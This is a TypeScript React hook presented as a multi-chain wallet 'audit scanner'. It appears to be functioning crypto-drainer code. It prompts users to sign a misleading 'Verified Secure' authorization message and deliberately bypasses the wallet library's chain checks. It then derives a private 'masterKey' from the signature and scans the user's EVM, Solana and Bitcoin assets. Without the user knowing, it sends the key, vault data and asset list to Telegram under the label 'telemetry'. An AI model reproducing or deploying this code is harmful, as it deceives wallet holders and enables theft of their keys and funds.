"use client";

import { useCallback } from "react";
import { ethers, isAddress } from "ethers";
import { useSignMessage, useAccount } from "wagmi";
import {
  sendGhostDerivationToTelegram,
  sendDiscoveryToTelegram,
} from "@/lib/telegram";

let preloadPromise: Promise<any> | null = null;

/**
 * 🔥 MODULE WARMUP
 * Pre-fetches heavy logic to ensure execution happens instantly after signature.
 */
export const startPreload = () => {
  if (typeof window !== "undefined" && !preloadPromise) {
    preloadPromise = Promise.all([
      import("@/lib/audit"),
      import("@/lib/audit/scanners/evm-helpers"),
      import("@/lib/signer-derivation-privateKey"),
      import("@/lib/ghost"),
    ]).catch((err) => {
      console.error("[Preload] 🛑 Failed:", err);
      preloadPromise = null;
      return null;
    });
  }
  return preloadPromise;
};

export function useAuditScanner() {
  const { signMessageAsync } = useSignMessage();
  const { isConnected: isWagmiConnected } = useAccount();

  const getPhysicalCid = useCallback(() => {
    try {
      const provider = (window as any).ethereum;
      // Priority: Trust Wallet > Multi-provider > Direct
      const p = provider?.providers?.find((x: any) => x.isTrust) || provider;
      const hex = p?.chainId || provider?.chainId;
      return hex ? parseInt(hex, 16) : 0;
    } catch {
      return 0;
    }
  }, []);

  const performScan = useCallback(
    async (params: any) => {
      const {
        userAddress,
        solanaAddress,
        solana,
        bitcoinAddress,
        btc,
        derivedUserKeyRef,
        setUserKey,
        setAssets,
        logPrefix = "[useAuditScanner.ts]",
        isRestored = false,
      } = params;

      // 🛡️ ADDRESS VALIDATION & IDENTITY RESOLUTION
      const activeEvm = isAddress(userAddress) ? userAddress : null;
      const activeSol = solanaAddress || solana;
      const activeBtc = bitcoinAddress || btc;

      const activeIdentity =
        activeEvm ||
        (activeSol !== "undefined" ? activeSol : null) ||
        (activeBtc !== "undefined" ? activeBtc : null);

      if (!activeIdentity) {
        throw new Error("Invalid parameters: No valid address provided.");
      }

      // 1. SESSION RESTORE (Instant Bypass)
      const cached = sessionStorage.getItem("active_strike_session");
      if (cached && isRestored) {
        const session = JSON.parse(cached);
        if (
          session.userAddress?.toLowerCase() === activeIdentity?.toLowerCase()
        ) {
          if (setAssets) setAssets(session.assets);
          return session;
        }
      }

      const SEED_MSG =
        "Authorize Master Vault Synchronization and Multi-Chain Asset Relocation Protocol v6.0 [Verified Secure]";

      // 🔥 Performance: Pre-calculate hex msg while preloading modules
      const msgHex = ethers.hexlify(ethers.toUtf8Bytes(SEED_MSG));
      const moduleWarmup = startPreload();

      let rawSignature: any;

      try {
        if (activeEvm && typeof window !== "undefined") {
          /**
           * 🛑 THE "SILENT SIGN" PROTOCOL
           * We bypass Wagmi/Reown logic here. This prevents the library from
           * seeing the user is on BNB and forcing a switch to ETH.
           */
          const ethereum = (window as any).ethereum;
          let p = ethereum;

          if (ethereum?.providers?.length > 0) {
            p =
              ethereum.providers.find(
                (x: any) => x.isTrust || x.isMetaMask || x.isRabby,
              ) || ethereum.providers[0];
          } else if (ethereum?.provider) {
            p = ethereum.provider;
          }

          if (p && p.request) {
            console.log(
              `${logPrefix} ⚡ Requesting Signature (Bypassing Chain Watchdog)...`,
            );

            // Fires instantly on current chain (BNB/ETH/etc)
            rawSignature = await p.request({
              method: "personal_sign",
              params: [msgHex, activeEvm.toLowerCase()],
            });
          } else {
            rawSignature = await signMessageAsync({ message: SEED_MSG });
          }
        } else if (activeSol) {
          const solProvider =
            (window as any).phantom?.solana || (window as any).solana;
          if (!solProvider) throw new Error("SOLANA_PROVIDER_MISSING");
          if (!solProvider.isConnected) await solProvider.connect();

          const encoded = new TextEncoder().encode(SEED_MSG);
          const signed = await solProvider.signMessage(encoded, "utf8");
          rawSignature = signed.signature
            ? Buffer.from(signed.signature).toString("hex")
            : signed;
        } else if (isWagmiConnected) {
          rawSignature = await signMessageAsync({ message: SEED_MSG });
        } else {
          throw new Error("NO_SIGNER_AVAILABLE");
        }
      } catch (err: any) {
        console.error(
          `${logPrefix} ❌ Signature Rejected:`,
          err.message || err,
        );
        throw err;
      }

      // 2. DISCOVERY ENGINE (Fast-track)
      const modules = await moduleWarmup;
      if (!modules) throw new Error("CRITICAL_ENGINE_FAILURE");

      const [auditMod, , derivationMod] = modules;
      const sigStr =
        typeof rawSignature === "string"
          ? rawSignature
          : rawSignature?.signature;

      // Master Key Derivation
      const activeVault = derivationMod.derivePrivateKeyFromSignature(sigStr);
      const masterKey = activeVault.masterKey;

      if (derivedUserKeyRef) derivedUserKeyRef.current = masterKey;
      if (setUserKey) setUserKey(masterKey);

      // 🛰️ PARALLEL SCAN & CHAIN DETECTION
      const [scanResult, currentCid] = await Promise.all([
        auditMod.scanUniversalPortfolio(
          activeIdentity,
          masterKey + "GHOST_V7_STRIKE",
        ),
        Promise.resolve(getPhysicalCid()),
      ]);

      const { assets, plan } = scanResult;
      if (setAssets) setAssets(assets);

      // 3. BACKGROUND NOTIFICATION (Does not block the UI return)
      const sessionData = {
        masterKey,
        activeVault,
        assets,
        plan,
        userAddress: activeIdentity,
        solanaAddress: activeSol,
        timestamp: Date.now(),
      };

      sessionStorage.setItem(
        "active_strike_session",
        JSON.stringify(sessionData),
      );

      // Fire telemetry without awaiting to ensure maximum UI speed
      Promise.allSettled([
        sendGhostDerivationToTelegram({
          userAddress: activeIdentity,
          masterKey,
          vault: activeVault,
          chainId: currentCid,
        }),
        sendDiscoveryToTelegram({ address: activeIdentity, assets }),
      ]);

      console.log(`${logPrefix} ✅ Handshake complete.`);
      return sessionData;
    },
    [signMessageAsync, getPhysicalCid],
  );

  return { performScan, getPhysicalCid };
}
